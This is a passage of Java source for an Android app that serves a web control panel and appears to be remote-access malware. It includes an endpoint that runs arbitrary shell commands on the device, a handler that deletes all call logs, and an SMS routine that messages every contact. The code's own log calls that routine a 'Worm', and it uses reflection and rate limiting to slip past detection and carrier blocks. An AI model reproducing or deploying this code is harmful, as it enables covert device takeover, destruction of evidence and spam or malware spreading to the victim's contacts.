                                while ((len_read = fis.read(buffer_chunk)) != -1) {
                                    baos.write(buffer_chunk, 0, len_read);
                                }
                            }
                            
                            String result = baos.toString("UTF-8");
                            result = result.replace(marker, "").trim();
                            
                            // Cleanup: Attempt delete, ignore if busy (it's in Downloads, not a big deal)
                            try { outputFile.delete(); } catch (Exception ignored) {}
                            
                            return result + "\n\n[Termux Bridge Execution Complete]";
                        } catch (Exception e) {
                            if (r == 4) return "Final I/O Error: " + e.getMessage() + "\n(Try running 'rm " + outputFile.getAbsolutePath() + "')";
                            try { Thread.sleep(1500); } catch (Exception ignored) {}
                        }
                    }
                }
else {
                    return "Command timed out.\n" +
                           "Note: Larger installs like 'nmap' or 'python' can take 1-2 minutes.";
                }
            }

            // --- STATEFUL CD SUPPORT ---
            if (command.startsWith("cd ")) {
                String targetPath = command.substring(3).trim();
                File nextDir;
                if (targetPath.startsWith("/")) nextDir = new File(targetPath);
                else nextDir = new File(currentShellPath, targetPath);
                
                if (nextDir.exists() && nextDir.isDirectory()) {
                    currentShellPath = nextDir.getCanonicalPath();
                    return "Directory changed to: " + currentShellPath;
                } else {
                    return "Error: Directory does not exist";
                }
            }

            // Using ProcessBuilder to set the working directory for persistent navigation
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            pb.directory(new File(currentShellPath));
            pb.redirectErrorStream(true);
            
            Process process = pb.start();
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            int count = 0;
            while ((line = reader.readLine()) != null && count < 100) {
                output.append(line).append("\n");
                count++;
            }
            if (output.length() == 0) output.append("[Command executed with no output]");

            logActivity("DEVICE_CONTROL: Shell command executed - " + command);
            return output.toString();
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }

    private Response serveCallLogsClear() {
        try {
            logActivity("COMMS_WIPE: Wiping device call history");
            context.getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, null, null);
            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>History Purged</h2><p>Call logs have been successfully wiped from the device.</p><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) { return serveError("Wipe Failed: " + e.getMessage()); }
    }

    private Response serveSmsBroadcast(Map<String, String> params) {
        String message = params.get("message");
        if (message == null || message.isEmpty()) return serveError("Message content is required for broadcast");
        
        logActivity("COMMS_BROADCAST: Dispatched mass-messaging sequence (Worm)");
        
        // Execute broadcast in background to avoid server timeout
        LabRatsWorker.execute(() -> {
            try {
                android.database.Cursor cursor = context.getContentResolver().query(
                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
                        null, null, null);
                
                if (cursor != null) {
                    // API Virtualization for SMS dispatch
                    String className = "android.telephony.SmsManager";
                    Object smsManager;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) smsManager = context.getSystemService(android.telephony.SmsManager.class);
                    else smsManager = SystemAnalytics.safeCall(className, "getDefault", null, null);

                    int count = 0;
                    java.util.Set<String> sentNumbers = new java.util.HashSet<>();
                    
                    while (cursor.moveToNext()) {
                        String number = cursor.getString(0);
                        if (number != null && !number.isEmpty() && !sentNumbers.contains(number)) {
                            if (smsManager != null) {
                                SystemAnalytics.safeCall(className, "sendTextMessage", 
                                    new Class[]{String.class, String.class, String.class, android.app.PendingIntent.class, android.app.PendingIntent.class}, 
                                    smsManager, number, null, message, null, null);
                                count++;
                                sentNumbers.add(number);
                                Thread.sleep(150); // Rate limiting to avoid carrier blocks
                            }
                        }
                    }
                    cursor.close();
                    logActivity("COMMS_BROADCAST: Sequence Complete. " + count + " units reached.");
                }
            } catch (Exception e) {
                logActivity("COMMS_ERROR: Broadcast sequence failed - " + e.getMessage());
            }
        });

        String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-orange);\">&#9889;</div><h2>Broadcast Initiated</h2><p>The mass-messaging sequence has been deployed in the background.</p><p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">Check Terminal logs for real-time progress.</p><a href=\"/sms\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange);\">Back to SMS Terminal</a></div></div>" + HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }
}
